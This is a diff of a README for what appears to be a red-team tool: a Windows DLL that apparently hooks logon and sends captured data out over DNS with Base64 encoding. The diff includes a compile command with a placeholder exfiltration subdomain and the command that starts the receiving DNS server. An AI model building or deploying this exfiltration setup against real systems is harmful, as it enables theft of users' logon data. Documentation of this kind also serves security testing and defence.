@@ -92,16 +92,18 @@ The information is received in a similar way to option 2:
 
 ![imgteams2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_teams2.png)
 
+
 <br>
 
 ## 5. DNS exfiltration + Base64-encoding
 
+This one is not ideal, as the maximum length for a subdomain is 63 characters so it requires multiple DNS queries. As a result, the logon process is delayed by a few seconds, making the slowdown noticeable in some cases.
+
 There is not a default subdomain, you have to set the value using the macro /DSUBDOMAIN:
 
 ```powershell
-cl /LD /DSUBDOMAIN=\".sub.domain.com\" 5_dns_base64.c crypt32.lib /link /OUT:test.dll
+cl /LD /DSUBDOMAIN=L\".SUBDOMAIN.DOMAIN.COM\" 5_dns_base64.c crypt32.lib /link /OUT:test.dll
 ```
-
 
 You can use [this repository](https://github.com/ricardojoserf/dns-exfiltration) for creating the necessary subdomains and the *dns_server.py* script to decode the received values.
 
@@ -111,7 +113,11 @@ python3 dns_server.py .SUBDOMAIN.DOMAIN.COM
 
 ![imgdns1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns1.png)
 
-**NOTE**: This option is not ideal, as the maximum length for a subdomain is 63 characters so it requires multiple DNS queries. As a result, the logon process is delayed by a few seconds, making the slowdown noticeable in some cases.
+It also generates a log file with the subdomains and decoded values:
+
+![imgdns2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/anp/Screenshot_dns2.png)
+
+
 
 <br>
 
